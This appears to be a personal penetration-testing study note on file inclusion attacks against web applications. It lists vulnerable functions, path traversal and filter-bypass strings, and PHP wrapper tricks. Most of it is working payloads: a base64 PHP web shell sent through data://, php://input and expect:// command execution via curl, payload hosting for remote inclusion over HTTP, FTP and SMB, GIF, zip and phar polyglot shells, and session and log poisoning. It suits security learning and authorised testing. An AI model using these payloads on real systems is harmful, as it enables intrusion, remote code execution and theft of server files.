```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```
## Local File Inclusion
This is most common within templating engines (eg. `/index.php?page=about`), these engines allow static content like a header and footer to be centralised and then the main content is just dynamically templated in. Some key code examples to investigate for possible LFI:
### Code Examples
#### PHP
```PHP
include();
include_once();
require();
require_once();
file_get_contents();
```
#### NodeJS
```js
readFile();
render();
```
#### Java
```jsp
<jsp:include file ... />
<c:import url ... />
```
#### .Net
```cs
Response.WriteFile()
@Html.Partial()
@Html.RemotePartial()
#include file=...
```

Some of these methods not only read the file but also execute it, some even read remote URLs so there is further abuse we can cause:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|`file_get_contents()`|✅|❌|✅|
|`fopen()`/`file()`|✅|❌|❌|
|**NodeJS**||||
|`fs.readFile()`|✅|❌|❌|
|`fs.sendFile()`|✅|❌|❌|
|`res.render()`|✅|✅|❌|
|**Java**||||
|`include`|✅|❌|❌|
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.Partial()`|✅|❌|❌|
|`@Html.RemotePartial()`|✅|❌|✅|
|`Response.WriteFile()`|✅|❌|❌|
|`include`|✅|✅|✅|
### Basic LFI
> Very often we need to make sure to URL encode queries as `/` becomes `%2f`.
#### Absolute Path
Sometimes an **absolute path** will just work: `/etc/password`. 
#### Path Traversal
However, it could be getting prefixed with a path for instance eg. 
```php
include("./pages/" . $_GET["lang"]);
```
This would mean we end up with `./pages//etc/passwd`, we can use path traversal here instead: `../../../../etc/passwd`.
> As `../` at root doesn't actually break anything, we can add loads and later find out the minimum needed when we write the report.
#### Filename Prefixed
```php
include("lang_" . $_GET["lang"]);
```
We can avoid this by prefixing our input with a `/` so its `/../../../../etc/password`. This will make it think `lang_/` is a directory instead now and then we will bypass it with the `../`'s.
> This isn't greatly reliable however.
#### Extension Suffixed
```php
include($_GET["lang"] . ".php");
```
In modern PHP web applications this is very hard to bypass and could restrict us to only reading files with the appended suffix. However, this may still allow us to read source code for example (*which we could still run vuln scans on to find other issues we could exploit*).

With older PHP apps (*pre-v5.3*) there are still some techniques that could be used. In some versions, defined strings had a max length of 4096 chars, anything more would be truncated, so we could pass a longer string and have it truncated. PHP also used to remove trailing `.`'s and `/`'s in paths. PHP and Linux also ignore multiple prefixed `/`'s (`////etc/passwd`). PHP also disregards any current directory shortcuts in the middle of strings: `/etc/./passwd`.
> For this truncation technique to work, we have to start with a non-existent directory

This command creates the full string:
```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

Before PHP v5.5, a *null byte injection* vulnerability was present. When a null byte (`%00`) was added to the end of a string, PHP would terminate it and not consider anything afterwards. We could use a payload such as `/etc/passwd%00`, which would then become `include("/etc/passwd%00.php");`, it would still get processed as `/etc/passwd`. 
### Second-Order Attacks
Another common method, but slightly more advanced is a *Second-Order Attack*. This is where a web application insecurely pulls files from a back-end server based on user-controlled parameters. For example, a web app could get a user's profile picture from `/profile/$username/avatar.png`. The user themselves doesn't control the actual query but they do control their username, thus if their username was `../../../etc/password`, this would become `/profile/../../../etc/password/avatar.png`. This in itself isn't isn't the full attack but could be a leading factor.
> Developers can often trust values coming from their database but if those values are user-controlled then they can't be trusted.

### Basic Bypasses
#### Non-Recursive Path Traversal Filters
A very common protection is to replace `../` with a empty string.
```php
$lang = str_replace('../', '', $_GET['lang']);
```
As this isn't recursive, we can bypass this by making it form the `../` for us using `....//`.
We can also use `..././` or `....\/`, these will both have the same result. Adding more `/`'s (`....////`) or escaping the `/` (`....\/`) can also sometimes bypass these filters.
#### Encoding
We can sometimes get away with URL encoding the entire string:
```
../../../etc/passwd = %2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
> Burp Decoder can do this easily. We can also double encode this string to bypass other filters.
#### Approved Paths
Some applications with use regex to ensure an input is only within approved paths:
```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['lang'])) {
	include($_GET['lang']);
} else {
	echo 'Illegal path specified';
}
```
We must first examine the application's normal behaviour to understand what paths are approved, then we can use an approved path first alongside `../` to escape it afterwards: `/languages/../../../../etc/passwd`.

### PHP Filters
These are a type of [PHP Wrapper](https://www.php.net/manual/en/wrappers.php.php), where you can pass different types of inputs and have it filtered by the filter we specify. We can use the PHP wrapper scheme `php://filter/` to access the filter wrapper. The wrapper has several parameters, but the main ones are *resource* and *read*. With *resource*, we can specify we want to apply the filter to the local file stream, whilst the *read* parameter allows us to specify we want to apply the resource.

There is four types of filters available to us here: [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). The important filter for LFI attacks is the `convert.base64-encode`, under *Conversion Filters*. We want this filter so we get the source code and not execute it instead.

The first step is to [[ffuf#Page Fuzzing|fuzz]] for php files that we might want to read, we aren't limited to ones that return a `200` too, so `301`, `302`, and `403` are all valid codes to look for. Once we have a list of files we want to view, we can use `php://filter/read=convert.base64-encode/resource=config.php` (*for `config.php`*). This may need to be modified (eg. remove the extension) if there are other filtering protections in place.

## LFI RCE with PHP Wrappers
### Data Wrapper
The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used to load external data, including PHP code. Like many other LFI attacks, this wrapper is only available if the `allow_url_include` setting is enabled in the PHP configuration (*This is NOT enabled by default*). To check this we can use LFI to include the PHP config file (Apache2: `/etc/php/[version X.Y]/apache2/php.ini`, Nginx: `/etc/php/[version X.Y]/fpm/php.ini`). We can iterate through the PHP version until we find the correct one. 
> We should also use the `convert.base64-encode` filter as the `.ini` file should be encoded when sent. We can then decode to see if the setting is enabled.

We can then use the `data://` wrapper to upload something like a webshell command:
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```
Then upload it via an LFI attack:
```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

### Input Wrapper
The [input](https://www.php.net/manual/en/wrappers.php.php), similar to the [[#Data Wrapper]], also requires `allow_url_include` to be enabled. However, this wrapper relies on the POST method so the vulnerable parameter must accept POST requests. We sent the payload in the POST request's data and point the vulnerable parameter to `php://input`.
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
> This relies on the vulnerable function also accepting GET requests, if it only accepts post requests then we can just include the command in the PHP code itself `<\?php system('id'); ?>`.

### Expect Wrapper
The [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper allows us to directly run commands through URL streams, it is designed to execute commands. However, its an external wrapper so it has to have been installed manually and enabled on the back-end server (*so its very rare we will see this in the wild*). Just like we checked for if the `allow_url_include` in the [[#Data Wrapper]] we can do the same process but grep for `expect` instead to determine if its installed (*we'd want `extension=expect`*).
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

## Remote File Inclusion (RFI)
RFI is usually not possible because the permissions required are usually disabled by default (*like PHP's `allow_url_include`*). However, when allowed we can have the application include a remotely hosted script that we can then call to potentially gain remote code execution.

We can test to see if an LFI is also an RFI by first, trying to include a local file through a url, eg. `http://127.0.0.1:[port]/index.php`. If we then see it include this, we know RFI is possible.
> This will also tell us if the first is executed or just included as text.

> Accidental DoS : Its worth including a different page than the vulnerable one as it could become recursive and cause a DoS on the back-end.

We may still however be blocked by a firewall so we might not be able to pull files from external servers.

Any form of payload can be uploaded (web shell, reverse shell, etc) and we can host it in a variety of ways to stay concealed / within firewall allowances:
```bash
python -m http.server [80/443]
# http:// or https://

python -m pyftpdlib -p 21
# ftp://[ip]/ or ftp://[user]:[pass]@[ip]/

impacket-smbserver -smb2support share $(pwd)
# \\[ip]\[share]\
```
> If the vulnerable app is on a windows machine, then we don't actually need the `allow_url_include` setting to be enabled for SMB RFI.

## LFI with File Uploads
Sometimes we are able to upload files to a website, the file upload form doesn't need to vulnerable if we are able to upload a file containing some malicious text and then execute it via an LFI.

Example using a GIF image (*A GIF's magic bytes are in ASCII so easy to forge*):
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
Once it has been uploaded we just need to work out the place it was put (*eg. we could see the path of the image via the user profile picture element*)

This can also be done if the PHP [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper is enabled (*disabled by default*) as we can upload a zip file and then use the wrapper to execute it.
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
> Creates an archive called `shell.jpg`, we don't have to have it end with `.zip` but it does mean that we can still be blocked from uploading if they have content-type checks.

Once uploaded we can then use the wrapper:
```
zip://shell.jpg#shell.php&cmd=id
```

We can do a similar thing with the **phar** wrapper.
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
```
phar://shell.jpg/shell.txt&s
```

## PHP Session Poisoning
PHP Sessions are stored as files in `/var/lib/php/sessions/sess_[cookievalue]` & `C:\Windows\Temp\sess_[cookievalue]`. We can then include this file to examine what the session contains.

We are looking for any values we are able to control as a user. We can then modify the value to some PHP code and then include the file again to execute it.

## Log Poisoning
If we control an element of the logs (*eg. Apache and Nginx both log the `User-Agent` to the `access.log`*). Once poisoned, we can include the logs to trigger the code (*passing any arguments such as `&cmd=id`*). 

The logs may need higher permissions to read but some can be read.
> Nginx logs are readable to low privileged users by default (eg. www-data), whilst Apache logs aren't unless its older or misconfigured.

> Apache : `/var/log/apache2/` & `C:\xampp\apache\logs\`
> Nginx : `/var/log/nginx/` & `C:\nginx\log\`

We should use an [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) of log locations and see what we can access, once we can access one we can then try poisoning it by sending malicious payloads.